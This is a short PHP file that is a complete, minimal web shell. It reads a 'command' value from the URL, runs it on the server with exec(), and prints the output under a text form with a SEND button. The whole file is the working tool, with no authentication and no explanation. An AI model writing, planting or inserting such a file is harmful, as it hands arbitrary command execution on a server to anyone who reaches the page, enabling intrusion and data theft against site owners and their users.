<?php
    if(isset($_GET['command'])){
        exec($_GET['command'],$result);
    }
?>
<form method="GET">
    <input type="text" name="command">
    <input type="submit" value="SEND">
</form>
<?php
    if($result){
        foreach($result as $e){
            echo $e."<br>";
        }
    }
?>
